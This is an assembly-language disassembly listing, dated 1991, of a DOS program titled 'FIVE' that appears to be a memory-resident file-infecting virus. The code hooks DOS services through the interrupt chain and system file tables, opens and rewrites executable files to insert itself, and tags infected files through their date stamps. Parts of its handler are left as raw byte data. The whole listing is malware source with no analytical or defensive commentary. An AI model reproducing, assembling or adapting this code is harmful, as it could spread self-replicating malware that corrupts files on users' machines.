PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                             FIVE                                     ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ      Created:   18-Jan-91                                            ÛÛ
;ÛÛ      Version:                                                        ÛÛ
;ÛÛ      Passes:    5          Analysis Options on: H                    ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e         equ     200h                    ; (0000:0200=0)
data_2e         equ     4                       ; (7415:0004=0)
data_6e         equ     0FE07h                  ; (7415:FE07=0)

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h

five            proc    far

start:
                mov     si,4
                mov     ds,si
                lds     dx,dword ptr [si+8]     ; Load 32 bit ptr
                mov     ah,13h
                int     2Fh                     ; Multiplex/Spooler al=func 00h
                                                ;  get installed status
                push    ds
                push    dx
                int     2Fh                     ; Multiplex/Spooler al=func 00h
                                                ;  get installed status
                pop     ax
                mov     di,0F8h
                stosw                           ; Store ax to es:[di]
                pop     ax
                stosw                           ; Store ax to es:[di]
                mov     ds,si
                lds     ax,dword ptr [si+40h]   ; Load 32 bit ptr
                cmp     ax,117h
                stosw                           ; Store ax to es:[di]
                mov     ax,ds
                stosw                           ; Store ax to es:[di]
                push    es
                push    di
                jnz     loc_1                   ; Jump if not zero
                shl     si,1                    ; Shift w/zeros fill
                mov     cx,1FFh
                repe    cmpsb                   ; Rep zf=1+cx >0 Cmp [si] to es:[di]
                jz      loc_2                   ; Jump if zero
loc_1:
                mov     ah,52h                  ; 'R'
                int     21h                     ; DOS Services  ah=function 52h
                                                ;  get DOS data table ptr es:bx
                push    es
                mov     si,0F8h
                les     di,dword ptr es:[bx+12h]        ; Load 32 bit ptr
                mov     dx,es:[di+2]
                mov     cx,207h
                rep     movs byte ptr es:[di],ss:[si]   ; Rep when cx >0 Mov [si] to es:[di]
                mov     ds,cx
                mov     di,16h
                mov     word ptr [di+6Eh],117h
                mov     [di+70h],es
                pop     ds
                mov     [bx+14h],dx
                mov     dx,cs
                mov     ds,dx
                mov     bx,[di-14h]
                dec     bh
                mov     es,bx
                cmp     dx,[di]
                mov     ds,[di]
                mov     dx,[di]
                dec     dx
                mov     ds,dx
                mov     si,cx
                mov     dx,di
                mov     cl,28h                  ; '('
                rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
                mov     ds,bx
                jc      loc_4                   ; Jump if carry Set
loc_2:
                mov     si,cx
                mov     ds,ss:[si+2Ch]
loc_3:
                lodsw                           ; String [si] to ax
                dec     si
                or      ax,ax                   ; Zero ?
                jnz     loc_3                   ; Jump if not zero
                lea     dx,[si+3]               ; Load effective addr
loc_4:
                mov     ax,3D00h
                int     21h                     ; DOS Services  ah=function 3Dh
                                                ;  open file, al=mode,name@ds:dx
                xchg    ax,bx
                pop     dx
                push    dx
                push    cs
                pop     ds
                push    ds
                pop     es
                mov     cl,2
                mov     ah,3Fh                  ; '?'
                int     21h                     ; DOS Services  ah=function 3Fh
                                                ;  read file, cx=bytes, to ds:dx
                mov     dl,cl
                xchg    cl,ch
                mov     al,byte ptr ds:[100h]   ; (7415:0100=0BEh)
                cmp     al,data_5               ; (7415:02FF=2Ah)
                jne     loc_5                   ; Jump if not equal
                mov     ah,3Fh                  ; '?'
loc_5:
                jmp     $-157h

five            endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1           proc    near
                push    bx
                mov     ax,1220h
                int     2Fh                     ; Multiplex/Spooler al=func 20h
                mov     bl,es:[di]
                mov     ax,1216h
                int     2Fh                     ; Multiplex/Spooler al=func 16h
                pop     bx
                lea     di,[di+15h]             ; Load effective addr
                mov     bp,200h
                retn
sub_1           endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_2           proc    near
                mov     ah,3Fh                  ; '?'

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_3:
                pushf                           ; Push flags
                push    cs
                call    sub_4                   ; (0248)
                retn
sub_2           endp

                db      0E8h, 0DFh, 0FFh, 26h, 8Bh, 35h
                db      0E8h, 0EFh, 0FFh, 72h, 24h, 3Bh
                db      0F5h, 73h, 20h, 50h, 26h, 8Ah
                db      45h, 0F8h, 0F6h, 0D0h, 24h, 1Fh
                db      75h, 14h, 26h, 3, 75h, 0FCh
                db      26h, 87h, 35h, 26h, 1, 6Dh
                db      0FCh, 0E8h, 0D0h, 0FFh, 26h, 29h
                db      6Dh, 0FCh, 96h, 0ABh
loc_6:
                pop     ax
loc_7:
                pop     es
                pop     si
                pop     di
                pop     bp
                retf    2                       ; Return far
                db      0E8h, 0C1h, 0FFh, 9Fh, 8Ah, 0C1h
                db      24h, 1Fh
                db      3Ch
data_4          db      1Fh
                db      75h, 2, 32h, 0C8h
loc_8:
                sahf                            ; Store ah into flags
                jmp     short loc_6             ; (01F6)
                db      55h, 57h, 56h, 6, 0FCh, 8Bh
                db      0ECh, 8Eh, 46h, 0Ah, 0BFh, 17h
                db      1, 8Bh, 0F7h, 2Eh, 0A7h, 74h
                db      22h, 80h, 0FCh, 3Fh, 74h, 0A1h
                db      50h, 3Dh, 0, 57h, 74h, 0D1h
                db      80h, 0FCh, 3Eh, 9Ch, 53h, 51h
                db      52h, 1Eh, 74h, 1Bh, 3Dh, 0
                db      4Bh, 74h, 11h
loc_9:
                pop     ds
                pop     dx
                pop     cx
                pop     bx
                popf                            ; Pop flags
                jz      loc_6                   ; Jump if zero
                pop     ax
                pop     es
                pop     si
                pop     di
                pop     bp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_4           proc    near
                jmp     dword ptr cs:data_2e    ; (7415:0004=0)
                db      0B4h, 3Dh, 0CDh, 21h, 93h, 0E8h
                db      55h, 0FFh, 72h, 0E5h, 33h, 0C9h
                db      87h, 0CDh, 8Eh, 0DDh, 0BEh, 4Ch
                db      0, 0ADh, 50h, 0ADh, 50h, 0B8h
                db      24h, 25h, 50h, 0FFh, 74h, 40h
                db      0FFh, 74h, 42h, 0Eh, 1Fh, 0BAh
                db      67h, 0, 0CDh, 21h, 0C5h, 54h
                db      0B0h, 0B0h, 13h, 0CDh, 21h, 6
                db      1Fh, 89h, 2Dh, 88h, 6Dh, 0EDh
                db      81h, 7Dh, 14h, 4Fh, 4Dh, 75h
                db      34h, 8Bh, 55h, 0FCh, 2, 0F5h
                db      80h, 0FEh, 4, 72h, 2Ah, 0F6h
                db      45h, 0EFh, 4, 75h, 24h, 0C5h
                db      75h, 0F2h, 38h, 6Ch, 4, 76h
                db      8, 4Ah, 0D0h, 0EEh, 22h, 74h
                db      4, 74h, 14h
loc_10:
                mov     ds,bp
                mov     dx,cx
                call    sub_2                   ; (01C0)
                mov     si,dx
                dec     cx

locloop_11:
                lodsb                           ; String [si] to al
                cmp     al,cs:data_6e[si]       ; (7415:FE07=0)
                jne     loc_13                  ; Jump if not equal
                loop    locloop_11              ; Loop if cx > 0

loc_12:
                mov     ah,3Eh                  ; '>'
                call    sub_3                   ; (01C2)
                pop     ds
                pop     dx
                pop     ax
                int     21h                     ; DOS Services  ah=function 00h
                                                ;  terminate, cs=progm seg prefx
                pop     ds
                pop     dx
                mov     al,13h
                int     21h                     ; DOS Services  ah=function 00h
                                                ;  terminate, cs=progm seg prefx
                jmp     loc_9                   ; (023C)
loc_13:
                mov     cx,dx
                mov     si,es:[di-4]
                mov     es:[di],si
                mov     ah,40h                  ; '@'
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                mov     al,ds:data_1e           ; (0000:0200=0)
                push    es
                pop     ds
                mov     [di-4],si
                mov     [di],bp
                or      byte ptr [di-8],1Fh
                push    cs
                pop     ds
                mov     data_4,al               ; (7415:0207=1Fh)
                mov     dx,8
                mov     ah,40h                  ; '@'
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                or      byte ptr es:[di-0Fh],40h        ; '@'
                jmp     short loc_12            ; (02BE)
sub_4           endp

data_5          db      2Ah

seg_a           ends



                end     start





